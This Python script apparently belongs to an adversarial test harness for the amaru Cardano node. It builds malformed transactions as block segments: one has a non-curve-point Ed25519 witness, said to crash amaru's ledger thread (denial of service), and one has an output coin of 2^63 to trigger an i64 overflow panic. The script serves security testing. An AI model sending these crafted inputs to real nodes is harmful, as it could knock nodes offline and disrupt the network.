#!/usr/bin/env python3
"""Build RANK 2 (malformed-witness) + RANK 3 (value/coin edge) block bodies for store-f block-apply.

RANK 2 — vkey non-curve-point: reuse the existing repro tx (spends funded 9708b921) carrying a
verification-key witness whose 32-byte key is not a valid Ed25519 curve point. amaru's ledger thread
panics at signature verification (node abort / DoS); cardano-node cleanly rejects. Convert the tx to
block segments [[body],[wits],aux,[]] + keep the tx as the submit pre-flight.

RANK 3 — value/coin i64 edge: craft a tx spending 9708b921 whose output coin exceeds i64::MAX
(2^63), to probe amaru value.rs lovelace_to_i64 (unreachable!) vs cardano's clean reject. If the
overflow coin can't live in a decodable-but-invalid body, pre-flight will show it (report, don't force).
"""
import json, cbor2, hashlib, sys
from pathlib import Path
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.primitives import serialization

ROOT = Path(__file__).resolve().parents[2]
FIX = ROOT / "antithesis/cardano_amaru_adversarial/fixture"
sys.path.insert(0, str(FIX / "collateral"))
from redeemers import split_tx  # noqa: E402
OUT = Path("/home/nigel/forge-work/pathb/outputs/forged-block")
VKEY_TX = Path("/home/nigel/sub3-outage-evidence/repro-vkey-noncurve-point.tx")
I64_MAX = (1 << 63) - 1


def raw_vkey(k):
    return k.public_key().public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw)


def write_segments(label, body, wits, aux, desc, extra):
    segs = [[body], [wits], aux if aux is not None else {}, []]
    seg_hex = cbor2.dumps(segs).hex()
    txid = hashlib.blake2b(cbor2.dumps(body), digest_size=32).hexdigest()
    rec = {"description": desc, "label": label, "body_segments_cbor_hex": seg_hex, "txid": txid,
           "n_txs": 1, "is_valid": True, "invalid_transactions": [],
           "note_for_codforge": "forge header parent 1000/181e9b48 (store-f) slot>=1001 97b0-leader, re-derive active nonce + VRF"}
    rec.update(extra)
    OUT.mkdir(parents=True, exist_ok=True)
    (OUT / f"{label}-block-segments.json").write_text(json.dumps(rec, indent=2) + "\n")
    return seg_hex, txid


def rank2_vkey():
    raw = bytes.fromhex(json.loads(VKEY_TX.read_text())["cborHex"])
    tx = cbor2.loads(raw)
    body, wits, aux = tx[0], tx[1], (tx[3] if len(tx) > 3 else None)
    seg_hex, txid = write_segments(
        "vkey-noncurve", body, wits, aux,
        "RANK 2 malformed-witness: Conway tx with a non-curve-point Ed25519 vkey witness. amaru "
        "ledger thread PANICS at signature verification (node abort/DoS); cardano-node cleanly rejects.",
        {"expected_amaru": "ledger-thread abort (crash)", "expected_cardano": "clean reject (invalid witness)",
         "reused_fixture": str(VKEY_TX)})
    # pre-flight = the repro tx verbatim
    (OUT / "vkey-noncurve-preflight.cbor").write_bytes(raw)
    print(f"[vkey-noncurve] txid {txid[:16]} seg_bytes {len(bytes.fromhex(seg_hex))} (reused repro tx, spends 9708b921)")


def rank3_value():
    seed = bytes.fromhex(json.loads((FIX / "funding" / "payment.skey").read_text())["cborHex"])[2:]
    pay = Ed25519PrivateKey.from_private_bytes(seed)
    raw = bytes.fromhex(json.loads((FIX / "mempool" / "mp-base.tx").read_text())["cborHex"])
    b, w, tail = split_tx(raw)
    base = cbor2.loads(b); tmpl_wits = cbor2.loads(w)
    inputs = base[0]; out0 = base[1][0]
    fund_addr = bytes(out0[0]); fee = base[2]
    overflow_coin = (1 << 63)  # i64::MAX + 1  (fits u64, overflows i64 -> lovelace_to_i64)
    body = {0: inputs, 1: [[fund_addr, overflow_coin]], 2: fee}
    body_b = cbor2.dumps(body)
    h = hashlib.blake2b(body_b, digest_size=32).digest()
    def rewrap(orig, lst):
        return cbor2.CBORTag(orig.tag, lst) if isinstance(orig, cbor2.CBORTag) else lst
    wits = {0: rewrap(tmpl_wits[0], [[raw_vkey(pay), pay.sign(h)]])}
    seg_hex, txid = write_segments(
        "value-overflow", body, wits, None,
        f"RANK 3 value/coin edge: output coin = 2^63 ({overflow_coin}) > i64::MAX ({I64_MAX}), spends "
        "9708b921. Probes amaru value.rs lovelace_to_i64 (unreachable!) vs cardano clean reject "
        "(value-not-conserved / coin bounds).",
        {"overflow_coin": overflow_coin, "i64_max": I64_MAX,
         "expected_amaru": "lovelace_to_i64 panic OR clean reject (pre-flight decides)",
         "expected_cardano": "clean reject"})
    (OUT / "value-overflow-preflight.cbor").write_bytes(cbor2.dumps([body, wits, True, None]))
    print(f"[value-overflow] txid {txid[:16]} out_coin 2^63={overflow_coin} seg_bytes {len(bytes.fromhex(seg_hex))}")


if __name__ == "__main__":
    rank2_vkey()
    rank3_value()
